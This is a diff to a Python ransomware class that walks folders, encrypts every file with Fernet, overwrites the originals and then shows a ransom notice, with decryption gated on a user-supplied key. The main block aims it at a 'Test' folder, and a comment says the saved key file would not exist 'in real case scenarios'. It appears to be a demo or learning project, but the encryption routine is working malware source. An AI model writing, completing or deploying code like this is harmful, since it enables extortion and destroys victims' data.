@@ -25,13 +25,19 @@ class Ransomware:
 
     @property
     def key(self):
+        """ Name of the malware. """
+        return self._key
+
+    @property
+    def gen_key(self):
         """ Key used for encryption of data. """
         key = Fernet.generate_key()
-        return key
+        self._key = key
+        return self._key
 
     def obtain_key(self):
         """ Obtain key from a user. """
-        return input("Please enter a key: ")
+        return input("Please enter a key: ").encode()
 
     def ransom_user(self):
         """ Inform user about encryption of his files. """
@@ -45,6 +51,7 @@ class Ransomware:
         :param str key: Decryption key.
         :param str filename: Name of the file.
         """
+        decrypted = Fernet(key).decrypt(contents)
 
     def get_files_in_folder(self, path):
         """ Returns a `list` of all files in the folder.
@@ -79,14 +86,31 @@ class Ransomware:
         """
         num_encrypted_files = 0
         files = self.get_all_files()
-            for file in files:
-                with open(file, "rb") as thefile:
-                    contents = thefile.read()
-                    num_encrypted_files += 1
-                contents_encrypted = Fernet(key).encrypt(contents)
-                with open(file, "wb") as thefile:
-                    thefile.write(contents_encrypted)
-                    self.ransom_user()
+        for file in files:
+            with open(file, "rb") as thefile:
+                contents = thefile.read()
+                num_encrypted_files += 1
+            contents_encrypted = Fernet(key).encrypt(contents)
+            with open(file, "wb") as thefile:
+                thefile.write(contents_encrypted)
+                self.ransom_user()
+
+        return num_encrypted_files
+
+    def encrypt_files_in_folder(self, key, path):
+        """ Encrypt all files in the infectedPC
+        :returns: Number of encrypted files (`int`).
+        """
+        num_encrypted_files = 0
+        files = self.get_files_in_folder(path)
+        for file in files:
+            with open(file, "rb") as thefile:
+                contents = thefile.read()
+                num_encrypted_files += 1
+            contents_encrypted = Fernet(key).encrypt(contents)
+            with open(file, "wb") as thefile:
+                thefile.write(contents_encrypted)
+                self.ransom_user()
 
         return num_encrypted_files
 
@@ -95,6 +119,7 @@ class Ransomware:
         by path.
         :param str path: Path of the folder to be decrypted.
         """
+        num_decrypted_files = 0
         # Obtain a key from the user.
         key = self.obtain_key()
         if key != self.key:
@@ -105,7 +130,14 @@ class Ransomware:
 
         # Decrypt each file in the directory.
         for file in files:
-            self.decrypt_file(key, file)
+            with open(file, "rb") as thefile:
+                contents = thefile.read()
+                contents_decrypted = Fernet(key).decrypt(contents)
+            with open(file, "wb") as thefile:
+                thefile.write(contents_decrypted)
+                num_decrypted_files += 1
+
+        return num_decrypted_files
 
 
 if __name__ == '__main__':
@@ -115,16 +147,18 @@ if __name__ == '__main__':
     ransomware = Ransomware('SimpleRansomware')
 
     #Find all specified files
-    files = ransomware.get_all_files
+    files = ransomware.get_files_in_folder('Test')
 
     #Generate key
-    key = ransomware.key()
-    with open("thekey.key","wb") sd thekey: #Key file in just to be sure we have the key, in real case scenarios this won't exist
+    key = ransomware.gen_key
+    with open("thekey.key","wb") as thekey: #Key file in just to be sure we have the key, in real case scenarios this won't exist
             thekey.write(key)
 
     # Encrypt files located in the same folder as our ransomware.
-    path = os.path.dirname(os.path.abspath(__file__))
-    number_encrypted_files = ransomware.encrypt_files_in_PC(key)
+    # path = os.path.dirname(os.path.abspath(__file__))
+    path = 'Test'
+
+    number_encrypted_files = ransomware.encrypt_files_in_folder(key, path)
     print('Number of encrypted files: {}'.format(number_encrypted_files))
 
     ransomware.decrypt_files_in_folder(path)
